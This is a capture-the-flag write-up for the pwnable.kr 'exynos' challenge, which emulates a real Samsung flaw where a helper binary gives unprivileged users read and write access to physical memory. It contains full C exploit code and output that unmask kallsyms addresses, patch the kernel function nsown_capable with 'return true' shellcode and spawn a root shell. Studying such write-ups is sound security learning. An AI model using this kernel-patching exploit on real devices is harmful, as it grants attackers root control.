# exynos - pwnable.kr 

This is the second challenge I've done in the `Hacker's Secret` category. It's an incredible challenge, so a writeup is due. Note that the challenges I've posted lately are all from the hardest `worlds`, which usually lack writeups. I do not upload this writeup for anyone to copy from; but rather to learn other techniques after you've finished. So, if you're here without finishing it yourself, please stop reading.

Something that I've found really exciting about this challenge is the fact that it is a real vulnerability that has been found on old Samsung phones. So, I'm really excited about this writeup. 

Let's get into it then:
```
How did Samsung accidently mess up their phone?

* there is gcc environment inside the QEMU box.
* no debugging environment is provided.

ssh exynos@pwnable.kr -p2222 (pw: flag of syscall)
```

Interesting, so we know this challenge somehow emulates a phone, and there's a cool vulnerability to find, which is most likely from the real world. 

Let's not waste time and `ssh` in:
```shell
~$ ssh exynos@pwnable.kr -p 2222
...
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
cttyhack: can't open '/dev/ttyS0': No such file or directory
sh: can't access tty; job control turned off
/ $
```

We can see we're immediately at a new environment, which is most likely the `phone` environment. 

Let's take a quick look here:
```shell
/ $ ls
bin         dev         exynos-mem  linuxrc     proc        sbin        tmp
boot        etc         lib         lost+found  root        sys         usr
```
Nothing pops up here other than this weird `exynos-mem` binary. 

Running it yields us:
```shell
/ $ ./exynos-mem
usage : exynos-mem [phyaddr] [bytesize] [mode(R/W-0/1)]
```
Huh, so, this binary lets us give it a physical address (if you do not know the difference between a physical and virtual address, please go read about `paging`, and stop here), a number of bytes, and a mode, which is either read/write, and I guess it reads/writes this physical memory for us?

Enough guesswork, lets extract it to our machine and look at it:
```shell
/ $ cat exynos-mem | bzip2 > /tmp/mem.zip
/ $ base64 /tmp/mem.zip
QlpoOTFBWSZTWfZZxOECx+H/////////////////////////////////////////////5BWEX3wf
b40RNaqgAI99Agn31lVXdl7znnve8Tutk3p7AO97XvWbCx9HXVQhChVR99EAlVJSAhU9c2gAAAAA
AAAB5bvX2oPvvbAAAAAKbnd2sNW2SgVSlS+8D6UPsBIrW1bNQDW7zx9VSl7Z0a7bve8+3s2KfKas
Bqi2zYAaMs2DQWznvRz0OlUCRQKFADk+7F6NQbaqVuBo0XwANGw+4DpyVp0NsBR157IXtar7sDu7
p9gecgrQaAd2N9896+0+u5ae3cdLtyTRd3Ke++Hr7fJAg7Uw6cqRxWgpZ2adU7n3ivTvpntt7vsE
h3XoqWbjuA9XB5xXXrrwAtzCihrQ3BuVhuSzYvc6u2imMAMyA+772oF6fAAAAvXeh7gbN1qsbJo1
...
```
And from the host:
```shell
~/pwn/exynos$ base64 -d zip.b64
~/pwn/exynos$ base64 -d zip.b64 | bzip2 -d > exynos-mem
```

Opening in IDA yields us:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v5; // [sp+8h] [bp-1Ch]
  int v6; // [sp+8h] [bp-1Ch]
  int mem; // [sp+Ch] [bp-18h]
  int addr; // [sp+10h] [bp-14h]
  int size; // [sp+14h] [bp-10h]
  int mode; // [sp+18h] [bp-Ch]
  int read_section; // [sp+1Ch] [bp-8h]

  if ( argc == 4 )
  {
    mem = open("/dev/mem", 2, envp);
    addr = atoi(argv[1]);
    size = atoi(argv[2]);
    mode = atoi(argv[3]);
    lseek(mem, addr, 0);
    read_section = malloc(size);
    v5 = 0;
    if ( mode )
    {
      if ( mode == 1 )
      {
        read(0, read_section, size);
        v5 = write(mem, read_section, size);
      }
      else
      {
        fwrite("wrong mode. 0:read, 1:write\n", 1, 28, stderr[0]);
      }
      fprintf(stderr[0], "processed %d bytes\n", v5);
    }
    else
    {
      read(mem, read_section, size);
      v6 = write(1, read_section, size);
      fprintf(stderr[0], "processed %d bytes\n", v6);
    }
  }
  else
  {
    puts("usage : exynos-mem [phyaddr] [bytesize] [mode(R/W-0/1)]", argv, envp);
  }
  return 0;
}
```

So, this does not need any reversing and is quite trivial. This binary simply lets us, normal users, read/write from/to whatever physical memory address. This is a huge primitive. But, how do we exploit it? We usually deal with virtual memory, and we have no idea what the layout of the physical memory is. 

Trying to run it on a random address yields:
```shell
/ $ ./exynos-mem 10000000 1024 0 | hexdump -C
processed 1024 bytes
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000400
```
Nothing. My first thought was to write a script which iterates chunk after chunk until it finds non-zero data, which I did. But I later realized that I do need a way to understand how the memory is mapped, otherwise I won't be able to do anything.

Lucky for us, Linux is pretty nice about it. I wanted to understand how to engage with the physical memory, and I found out the `/proc/iomem` file (this took quite a bit of tinkering with the `exynos-mem` to understand how everything looks). This file effectively maps out the entire layout of the physical memory into segments for the user to understand:
```shell
/ $ cat /proc/iomem
10000000-10000fff : vexpress-sysreg
  10000000-10000fff : vexpress-sysreg
10002000-10002fff : versatile-i2c.0
10004000-10004fff : mb:aaci
  10004000-10004fff : aaci-pl041
10005000-10005fff : mb:mmci
  10005000-10005fff : mmci-pl18x
10006000-10006fff : mb:kmi0
  10006000-10006fff : kmi-pl050
10007000-10007fff : mb:kmi1
  10007000-10007fff : kmi-pl050
10009000-10009fff : mb:uart0
  10009000-10009fff : uart-pl011
1000a000-1000afff : mb:uart1
  1000a000-1000afff : uart-pl011
1000b000-1000bfff : mb:uart2
  1000b000-1000bfff : uart-pl011
1000c000-1000cfff : mb:uart3
  1000c000-1000cfff : uart-pl011
10016000-10016fff : versatile-i2c.1
10017000-10017fff : mb:rtc
  10017000-10017fff : rtc-pl031
1001a000-1001a0ff : pata_platform
1001a100-1001afff : pata_platform
10020000-10020fff : ct:clcd
  10020000-10020fff : clcd-pl11x
40000000-43ffffff : physmap-flash
44000000-47ffffff : physmap-flash
4e000000-4e00ffff : smsc911x
  4e000000-4e00ffff : smsc911x
4f000000-4f01ffff : isp1760
60000000-66dfffff : System RAM
  60008000-60485f3f : Kernel code
  604ba000-605065cf : Kernel data
``` 

Thats actually pretty exciting; we know the whole layout now. The only parts that seem interesting to me are the `System Ram: Kernel Code/Data`. 

At this point, we have enough information about the vulnerability to map out possible attack plans.

## Attack Plans

To summarize what we have until now:
1. We have a very strong primitive which lets us read/write from/to whatever physical memory we want.
2. We know, roughly, the layout of the physical memory, including where the kernel resides.

So, what can we do?
1. We can utilize the fact that we can scan the whole kernel memory to find our `task_struct`, in which there's the `cred` struct that contains our `uid, suid, euid` etc. Meaning, if we can overwrite this `cred` struct to give us root permissions, we win.
2. We can overwrite actual kernel code to let us bypass the checks of `setuid()`. This requires reading some kernel code, which is extra fun.
3. We can find a function that we can trigger, and fully overwrite it with `commit_creds(prepare_kernel_creds(0))` shellcode. 

And there are infinitely more things to do. This is how strong of a primitive this is.

Out of these options, I chose option 2, due to the simpleness of it. 

## Exploit

Lets begin by finding out what function we want to overwrite by reading the kernel source code for `setuid()`:
```c
/*
 * setuid() is implemented like SysV with SAVED_IDS 
 * 
 * Note that SAVED_ID's is deficient in that a setuid root program
 * like sendmail, for example, cannot set its uid to be a normal 
 * user and then switch back, because if you're root, setuid() sets
 * the saved uid too.  If you don't like this, blame the bright people
 * in the POSIX committee and/or USG.  Note that the BSD-style setreuid()
 * will allow a root program to temporarily drop privileges and be able to
 * regain them by swapping the real and effective uid.  
 */
SYSCALL_DEFINE1(setuid, uid_t, uid)
{
	struct user_namespace *ns = current_user_ns();
	const struct cred *old;
	struct cred *new;
	int retval;
	kuid_t kuid;

	kuid = make_kuid(ns, uid);
	if (!uid_valid(kuid))
		return -EINVAL;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;
	old = current_cred();

	retval = -EPERM;
	if (nsown_capable(CAP_SETUID)) {
		new->suid = new->uid = kuid;
		if (!uid_eq(kuid, old->uid)) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
	} else if (!uid_eq(kuid, old->uid) && !uid_eq(kuid, new->suid)) {
		goto error;
	}

	new->fsuid = new->euid = kuid;

	retval = security_task_fix_setuid(new, old, LSM_SETID_ID);
	if (retval < 0)
		goto error;

	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}
```

We can see that there's a function here that most likely signifies whether or not a user may perform the `setuid(0)`, which is called `nsown_capable`. We can clearly see that if this function returns anything other than true, we almost automatically perform `goto error`, and that if it is true, it sets our `uid` to the new `uid` created.

Even the documentation of this function suggests that it will help us:
```c
/**
 * nsown_capable - Check superior capability to one's own user_ns
 * @cap: The capability in question
 *
 * Return true if the current task has the given superior capability
 * targeted at its own user namespace.
 */
bool nsown_capable(int cap)
{
	return ns_capable(current_user_ns(), cap);
}
```

That is pretty cool. That means we now know which function we want to overwrite in the kernel.

We simply need to find its physical address using its offset from the kernel text base and then its easy from there:
```shell
/ $ cat /proc/kallsyms | grep nsown_capable
00000000 T nsown_capable
```

... Or so we thought. We're non-root, so we do not have access to the `/proc/kallsyms` file (or, rather, to the addresses), and we have no idea where the symbol resides. That stumps us, and we need a way to know where the symbol is.

Now, we face a few options:
1. We dump the whole kernel to our host machine and examine it like so to find the offset.
2. We research `kallsyms` to try and understand if we can somehow trigger it to print the addresses to us.
3. We move to another option as an attack plan.

I heavily dislike the first idea, due to it being very tidious and boring, and I do not want to give up so early, especially as this is an exercise for me to dive deeper into kernel exploitation. Hence, we proceed with number 2.

The first thing I did was google for a bit, but it yielded nothing. The research must be done via the source code, so let's dive [into the source code](https://android.googlesource.com/kernel/common/+/android-trusty-3.10/kernel/kallsyms.c):
```c
...
static int s_show(struct seq_file *m, void *p)
{
	struct kallsym_iter *iter = m->private;
	/* Some debugging symbols have no name.  Ignore them. */
	if (!iter->name[0])
		return 0;
	if (iter->module_name[0]) {
		char type;
		/*
		 * Label it "global" if it is exported,
		 * "local" if not exported.
		 */
		type = iter->exported ? toupper(iter->type) :
					tolower(iter->type);
		seq_printf(m, "%pK %c %s\t[%s]\n", (void *)iter->value,
			   type, iter->name, iter->module_name);
	} else
		seq_printf(m, "%pK %c %s\n", (void *)iter->value,
			   iter->type, iter->name);
	return 0;
}
...
```

A lot of the source code was normal, but something about this part seemed interesting to me. This is the part that prints the addresses, and it has a weird format specifier I've never seen before.. `%pK`? 

A quick google yields us to [the linux kernel printk formats documentation](https://www.kernel.org/doc/Documentation/printk-formats.txt) which describes this:
```
Kernel Pointers
===============

::

	%pK	01234567 or 0123456789abcdef

For printing kernel pointers which should be hidden from unprivileged
users. The behaviour of ``%pK`` depends on the ``kptr_restrict sysctl`` - see
Documentation/sysctl/kernel.txt for more details.
```

So.. this format specifier is what hides these addresses from us. That's a cool kernel thing to learn. It also seems that it depends on something called `kptr_restrict` which is a `sysctl`, let's read a bit about it:
```
kptr_restrict:

This toggle indicates whether restrictions are placed on
exposing kernel addresses via /proc and other interfaces.

When kptr_restrict is set to 0 (the default) the address is hashed before
printing. (This is the equivalent to %p.)

When kptr_restrict is set to (1), kernel pointers printed using the %pK
format specifier will be replaced with 0's unless the user has CAP_SYSLOG
and effective user and group ids are equal to the real ids.
```

Very interesting, and also gives us two interesting ideas regarding how to bypass the `kallsyms` restriction. The first is to simply find `kptr_restrict` and then change its value to `0`, while the other is to simply change the formatting of the print to `%p` instead of `%pK`.

I dove a bit into how we can find `kptr_restrict` and due to the string not appearing right before the value or the address to the value I decided to go for the other solution (although I do like the `kptr_restrict` solution and will implement it as well for learning).

So, this solution is quite simple and cool. We simply want to scan for the formatting of the `kallsyms printk`, and whenever we notice the pattern, we simply switch `%pK` with `%p `. This requires some C code, so let's get started.

First, we want to create some sort of a clean API to the program itself and to set some contants:
```c
// Kernel Parameters.
#define KERNEL_START (0x60008000) 
#define KERNEL_END (0x605065cf)
// The added offset to the PAGE_OFFSET. 
// For example, for 0xc0008000 it is 0x8000.
#define KERNEL_VIRT_OFFSET (0x8000) 
#define KALLSYMS "/proc/kallsyms"
#define KALLSYMS_FMT "%pK %c %s\n"
#define PATCHED_KALLSYMS_FMT "%p "
#define PATCHED_FMT_SIZE (3)
#define NSOWN_CAPABLE "nsown_capable"

// Misc.
#define MAX_SIZE (256)
#define MAX_SYM_SIZE (128)
#define CHUNK_SIZE (1024 * 50) // 50 KB.
#define EXYNOS_MEM_CMD_FMT_R "./exynos-mem %lu %d 0"
#define EXYNOS_MEM_CMD_FMT_W "./exynos-mem %lu %d 1"

void _exynos_mem_write(uint32_t address, uint8_t* data, uint32_t length) {
    FILE* fp;
    unsigned char cmd[MAX_SIZE] = { 0, };
    
    snprintf(cmd, sizeof(cmd), EXYNOS_MEM_CMD_FMT_W, address, length);
    printf("[*] Running Exynos-Mem Write @ %p\n", address);

    fp = popen(cmd, "w");
    if (!fp) {
        perror("popen failed.");
        exit(-1);
    }

    fwrite(data, 1, length, fp);

    pclose(fp);
}

void _exynos_mem_read(uint32_t address, uint32_t length, uint8_t* buf) {
    FILE* fp;
    unsigned char cmd[MAX_SIZE] = { 0, };
    uint32_t read_bytes = 0;
    
    snprintf(cmd, sizeof(cmd), EXYNOS_MEM_CMD_FMT_R, address, length);

    fp = popen(cmd, "r");
    if (!fp) {
        perror("popen failed.");
        exit(-1);
    }

    read_bytes = fread(buf, 1, length, fp);
    if (length != read_bytes) {
        printf("Failed to read bytes from Exynos-Mem @ %p.", address);
    }

    pclose(fp);
}
```

Now, we want to scan the whole memory region of the kernel and replace the formats:
```c

void _scan_and_patch_string(uint8_t* buf, uint32_t base_addr) {
    const char *pattern = KALLSYMS_FMT;
    size_t patlen = strlen(pattern);

    for (size_t offset = 0; offset + patlen <= CHUNK_SIZE; offset++) {
        if (memcmp(buf + offset, pattern, patlen) == 0) {            
            // Replace "%pK" with "%p "
            // This causes kallsyms to print addresses even
            // as a non-root user.
            _exynos_mem_write(base_addr + offset, PATCHED_KALLSYMS_FMT, PATCHED_FMT_SIZE);

            printf("[*] Patched kallsyms format @ offset 0x%zx, address 0x%zx\n", offset, base_addr + offset);

            offset += patlen - 1;
        }
    }
}

void kallsyms_fmt_patcher(void) {
    uint8_t buf[CHUNK_SIZE] = { 0 };
    uint32_t addr = KERNEL_START;

    while (addr < KERNEL_END) {
        _exynos_mem_read(addr, CHUNK_SIZE, buf);
        _scan_and_patch_string(buf, addr);

        addr += CHUNK_SIZE;
    }
}
```

Running the `kallsyms_fmt_patcher` yields us this output:
```shell
...
processed 51200 bytes
processed 51200 bytes
[*] Running Exynos-Mem Write @ 0x60409e84
processed 3 bytes
[*] Patched kallsyms format @ offset 0xe84, address 0x60409e84
processed 51200 bytes
processed 51200 bytes
processed 51200 bytes
...
```

It seems like it found the format and patched it! Let's see whether it actually changed the format and check if `kallsyms` works now:
```shell
/ $ ./exynos-mem 1614847620 10 0 | hexdump -C
processed 10 bytes
00000000  25 70 20 20 25 63 20 25  73 0a                    |%p  %c %s.|
0000000a
/ $ cat /proc/kallsyms | grep nsown_capable
80027c9c  T nsown_capable
```

That made me really excited, it actualy worked!

Now, we simply need to find the start of the text section, and find the offset from there to add to our `kernel code start`:
```shell
/ $ cat /proc/kallsyms | head -n20
  (null)  t __vectors_start
80008240  T asm_do_IRQ
80008240  T _stext
...
```
We can see _stext at `0x80008240`, which isn't page aligned, meaning the actual start is `0x80008000` which actually simplifies some calculations for us since our starting offset is also `0x8000`.

This means, `nsown_capable` resides at `0x60027c9c`. At this point, I had to fact check, so I checked the syscall table to ensure I am okay with the offsets:
```shell
/ $ cat /proc/kallsyms | grep sys_call_table
8000e348  T sys_call_table
/ $ ./exynos-mem 1610670920 1024 0 | hexdump -C
processed 1024 bytes
00000000  d8 d1 02 80 e4 25 02 80  24 f7 01 80 34 eb 0b 80  |.....%..$...4...|
00000010  9c eb 0b 80 48 db 0b 80  74 db 0b 80 cc af 03 80  |....H...t.......|
00000020  68 db 0b 80 fc c1 0c 80  9c bf 0c 80 b0 4b 0c 80  |h............K..|
00000030  38 d3 0b 80 cc af 03 80  98 be 0c 80 a8 d5 0b 80  |8...............|
00000040  d4 07 06 80 cc af 03 80  cc af 03 80 30 e2 0b 80  |............0...|
00000050  a0 f8 02 80 c0 b4 0d 80  cc af 03 80 68 08 06 80  |............h...|
00000060  dc 0c 06 80 cc af 03 80  70 85 02 80 cc af 03 80  |........p.......|
00000070  cc af 03 80 a0 e5 02 80  cc af 03 80 cc af 03 80  |................|
00000080  cc af 03 80 24 d3 0b 80  88 3d 04 80 cc af 03 80  |....$....=......|
00000090  78 4b 0e 80 d4 db 02 80  88 c4 0c 80 60 bf 0c 80  |xK..........`...|
000000a0  70 bf 0c 80 68 80 0d 80  d8 65 0c 80 58 fa 02 80  |p...h....e..X...|
000000b0  cc af 03 80 60 94 0a 80  34 08 06 80 94 0d 06 80  |....`...4.......|
```
This looks like a syscall table, so that means we're understanding everything correctly.

Let's now add the code to pwn this by setting `nsown_capable` to simply `return true;` always:
```c
uint32_t extract_sym_addr(char* sym) {
    FILE *fp; 
    char line[MAX_SIZE];
    uint32_t addr = 0;

    fp = fopen(KALLSYMS, "r");
    if (!fp) {
        perror("fopen /proc/kallsyms");
        exit(1);
    }

    while (fgets(line, sizeof(line), fp)) {
        char sym_name[MAX_SYM_SIZE];
        unsigned long parsed_addr;
        char type;

        if (sscanf(line, "%lx %c %127s", &parsed_addr, &type, sym_name) == 3) {
            if (!strcmp(sym_name, sym)) {
                printf("[*] Found symbol %s @ %p.\n", sym_name, parsed_addr);
                addr = (uint32_t)parsed_addr;
                break;
            }
        }
    }

    fclose(fp);
    return addr;
}

void change_to_return_true(uint32_t kernel_sym_addr) {
    unsigned char ret_true_shellcode[] = {
        0x01, 0x00, 0xa0, 0xe3, 0x1e, 0xff, 0x2f, 0xe1, 
    };
    // The address we get is a kernelic symbol address, and a virtual one at that.
    // In our case, we'll assume it is an address that looks similar to this:
    // 0x8000e348 / 0xc000e348 - meaning, a page offset that is in the upper-most byte.
    uint32_t phys_offset = ((kernel_sym_addr & 0x0fffffff) - KERNEL_VIRT_OFFSET) + KERNEL_START;
    printf("[*] Patching function @ %p to return true.\n", phys_offset);
    _exynos_mem_write(phys_offset, ret_true_shellcode, sizeof(ret_true_shellcode));
}

int main(void) {
    // Patch kallsyms formatting to bypass %pK by replacing 
    // it with %p.
    kallsyms_fmt_patcher();

    // Now that kallsyms is readable to us; extract the nsown_capable symbol,
    // and then change the function to always return true.
    change_to_return_true(extract_sym_addr(NSOWN_CAPABLE));
    
    printf("[*] Sleeping to flush i-cache in case its needed...\n");
    sleep(10);

    if (0 != setuid(0)) {
        printf("[X] setuid() failed! Something went wrong..");
        exit(-1);
    }

    printf("[!] You are r00t :)\n");
    printf("[!] getuid(): %d\n", getuid());
    printf("[!] have fun with shell!\n");

    system("/bin/sh");
}
```

Note that we add a 10 second `sleep` in order to flush the instruction cache. Now, let's see if it works:
```shell
[*] Running Exynos-Mem Write @ 0x60409e84
processed 3 bytes
[*] Patched kallsyms format @ offset 0xe84, address 0x60409e84
[*] Found symbol nsown_capable @ 0x80027c9c.
[*] Patching function @ 0x60027c9c to return true.
[*] Running Exynos-Mem Write @ 0x60027c9c
processed 8 bytes
[*] Sleeping to flush i-cache in case its needed...
[!] You are r00t :)
[!] getuid(): 0
[!] have fun with shell!
/bin/sh: can't access tty; job control turned off
/ # whoami
whoami: unknown uid 0
/ # cat root/flag
[redacted-please-solve-on-your-own]
```

This has been an incredible challenge, and has given me some inspiration to do more kernel challenge; so stay tuned.

The source code is [here](https://github.com/yoavthewk/exynos-exploit/blob/main/r00ter.c).